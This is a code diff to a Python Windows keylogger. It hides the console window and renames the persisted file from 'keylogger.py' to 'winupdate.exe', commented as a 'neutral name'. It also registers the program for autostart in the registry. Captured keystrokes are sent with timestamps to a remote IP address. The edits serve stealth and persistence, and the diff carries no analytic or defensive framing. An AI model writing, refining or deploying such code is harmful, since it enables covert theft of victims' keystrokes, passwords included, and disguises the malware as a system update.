@@ -11,13 +11,11 @@ import os
 from tkintertable import App 
 
 win = win32console.GetConsoleWindow() 
-win32gui.ShowWindow(win, 1) 
-App.main() #debug the windows startup
-
+win32gui.ShowWindow(win, 0) 
 
 def addToRegistry(): #add to windows startup
 	pth = os.path.dirname(os.path.realpath(__file__)) 
-	script="keylogger.py"
+	script="winupdate.exe" #neutral name
 	address=os.path.join(pth,script)
 	print(address)
 	key = reg.HKEY_CURRENT_USER 
@@ -75,7 +73,10 @@ def on_press(key):
 		fire_and_forget(ip_addr, {timestamp:keys[:]})
 		keys.clear()
 
-with Listener(on_press=on_press) as listener:
-	addToRegistry()
-	ip_addr=read_ip()
-	listener.join()
+if __name__ == "__main__":
+	#App.main() debugging purposes
+	with Listener(on_press=on_press) as listener:
+		addToRegistry()
+		ip_addr=read_ip()
+		listener.join()
+
